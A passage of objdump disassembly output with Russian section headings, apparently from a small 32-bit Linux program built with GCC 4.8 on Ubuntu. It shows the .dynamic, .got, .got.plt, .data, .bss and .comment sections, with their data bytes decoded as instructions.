 8049f51:	81 04 08 05 00 00 00 	addl   $0x5,(%eax,%ecx,1)
 8049f58:	50                   	push   %eax
 8049f59:	82                   	(bad)  
 8049f5a:	04 08                	add    $0x8,%al
 8049f5c:	06                   	push   %es
 8049f5d:	00 00                	add    %al,(%eax)
 8049f5f:	00 d0                	add    %dl,%al
 8049f61:	81 04 08 0a 00 00 00 	addl   $0xa,(%eax,%ecx,1)
 8049f68:	76 00                	jbe    8049f6a <_DYNAMIC+0x56>
 8049f6a:	00 00                	add    %al,(%eax)
 8049f6c:	0b 00                	or     (%eax),%eax
 8049f6e:	00 00                	add    %al,(%eax)
 8049f70:	10 00                	adc    %al,(%eax)
 8049f72:	00 00                	add    %al,(%eax)
 8049f74:	15 00 00 00 00       	adc    $0x0,%eax
 8049f79:	00 00                	add    %al,(%eax)
 8049f7b:	00 03                	add    %al,(%ebx)
 8049f7d:	00 00                	add    %al,(%eax)
 8049f7f:	00 00                	add    %al,(%eax)
 8049f81:	a0 04 08 02 00       	mov    0x20804,%al
 8049f86:	00 00                	add    %al,(%eax)
 8049f88:	28 00                	sub    %al,(%eax)
 8049f8a:	00 00                	add    %al,(%eax)
 8049f8c:	14 00                	adc    $0x0,%al
 8049f8e:	00 00                	add    %al,(%eax)
 8049f90:	11 00                	adc    %eax,(%eax)
 8049f92:	00 00                	add    %al,(%eax)
 8049f94:	17                   	pop    %ss
 8049f95:	00 00                	add    %al,(%eax)
 8049f97:	00 18                	add    %bl,(%eax)
 8049f99:	83 04 08 11          	addl   $0x11,(%eax,%ecx,1)
 8049f9d:	00 00                	add    %al,(%eax)
 8049f9f:	00 08                	add    %cl,(%eax)
 8049fa1:	83 04 08 12          	addl   $0x12,(%eax,%ecx,1)
 8049fa5:	00 00                	add    %al,(%eax)
 8049fa7:	00 10                	add    %dl,(%eax)
 8049fa9:	00 00                	add    %al,(%eax)
 8049fab:	00 13                	add    %dl,(%ebx)
 8049fad:	00 00                	add    %al,(%eax)
 8049faf:	00 08                	add    %cl,(%eax)
 8049fb1:	00 00                	add    %al,(%eax)
 8049fb3:	00 fe                	add    %bh,%dh
 8049fb5:	ff                   	(bad)  
 8049fb6:	ff 6f d8             	ljmp   *-0x28(%edi)
 8049fb9:	82                   	(bad)  
 8049fba:	04 08                	add    $0x8,%al
 8049fbc:	ff                   	(bad)  
 8049fbd:	ff                   	(bad)  
 8049fbe:	ff 6f 01             	ljmp   *0x1(%edi)
 8049fc1:	00 00                	add    %al,(%eax)
 8049fc3:	00 f0                	add    %dh,%al
 8049fc5:	ff                   	(bad)  
 8049fc6:	ff 6f c6             	ljmp   *-0x3a(%edi)
 8049fc9:	82                   	(bad)  
 8049fca:	04 08                	add    $0x8,%al
	...

Дизассемблирование раздела .got:

08049ffc <.got>:
 8049ffc:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .got.plt:

0804a000 <_GLOBAL_OFFSET_TABLE_>:
 804a000:	14 9f                	adc    $0x9f,%al
 804a002:	04 08                	add    $0x8,%al
	...
 804a00c:	86 83 04 08 96 83    	xchg   %al,-0x7c69f7fc(%ebx)
 804a012:	04 08                	add    $0x8,%al
 804a014:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
 804a015:	83 04 08 b6          	addl   $0xffffffb6,(%eax,%ecx,1)
 804a019:	83 04 08 c6          	addl   $0xffffffc6,(%eax,%ecx,1)
 804a01d:	83                   	.byte 0x83
 804a01e:	04 08                	add    $0x8,%al

Дизассемблирование раздела .data:

0804a020 <__data_start>:
 804a020:	00 00                	add    %al,(%eax)
	...

0804a024 <__dso_handle>:
 804a024:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .bss:

0804a040 <stdout@@GLIBC_2.0>:
 804a040:	00 00                	add    %al,(%eax)
	...

0804a044 <completed.6591>:
 804a044:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .comment:

00000000 <.comment>:
   0:	47                   	inc    %edi
   1:	43                   	inc    %ebx
   2:	43                   	inc    %ebx
   3:	3a 20                	cmp    (%eax),%ah
   5:	28 55 62             	sub    %dl,0x62(%ebp)
   8:	75 6e                	jne    78 <_init-0x80482c8>
   a:	74 75                	je     81 <_init-0x80482bf>
   c:	20 34 2e             	and    %dh,(%esi,%ebp,1)
   f:	38 2e                	cmp    %ch,(%esi)
  11:	34 2d                	xor    $0x2d,%al
  13:	32 75 62             	xor    0x62(%ebp),%dh
  16:	75 6e                	jne    86 <_init-0x80482ba>
  18:	74 75                	je     8f <_init-0x80482b1>
  1a:	31 7e 31             	xor    %edi,0x31(%esi)
  1d:	34 2e                	xor    $0x2e,%al
  1f:	30 34 29             	xor    %dh,(%ecx,%ebp,1)
  22:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  25:	38 2e                	cmp    %ch,(%esi)
  27:	34 00                	xor    $0x0,%al
  29:	47                   	inc    %edi
  2a:	43                   	inc    %ebx
  2b:	43                   	inc    %ebx
  2c:	3a 20                	cmp    (%eax),%ah
  2e:	28 55 62             	sub    %dl,0x62(%ebp)
  31:	75 6e                	jne    a1 <_init-0x804829f>
  33:	74 75                	je     aa <_init-0x8048296>
  35:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  38:	38 2e                	cmp    %ch,(%esi)
  3a:	32 2d 31 39 75 62    	xor    0x62753931,%ch
  40:	75 6e                	jne    b0 <_init-0x8048290>
  42:	74 75                	je     b9 <_init-0x8048287>
  44:	31 29                	xor    %ebp,(%ecx)
  46:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  49:	38 2e                	cmp    %ch,(%esi)
  4b:	32 00                	xor    (%eax),%al
